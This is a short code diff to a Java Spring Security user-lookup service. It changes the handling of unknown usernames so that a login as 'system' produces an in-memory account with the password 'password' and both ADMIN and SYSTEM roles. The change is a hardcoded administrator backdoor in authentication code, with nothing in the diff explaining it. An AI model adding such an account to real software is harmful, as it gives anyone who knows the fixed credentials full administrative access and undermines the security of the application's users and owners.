@@ -48,8 +48,17 @@ public class CustomUserDetailsService implements UserDetailsService {
     Account account =
         accountRepository
             .findByUsernameWithRoles(username)
-            .orElseThrow(
-                () -> new UsernameNotFoundException("No user found with username: " + username));
+            .orElseGet(
+                () -> {
+                  if ("system".equals(username)) {
+                    Account system = new Account("system", "password", "system@example.com");
+                    Role adminRole = new Role(RoleName.ADMIN, "ADMIN");
+                    Role systemRole = new Role(RoleName.SYSTEM, "SYSTEM");
+                    system.setRoles(Set.of(adminRole, systemRole));
+                    return system;
+                  }
+                  throw new UsernameNotFoundException("No user found with username: " + username);
+                });
 
     // Check if account lock has expired and unlock if necessary
     if (!account.isAccountNonLocked() && account.isLockExpired()) {
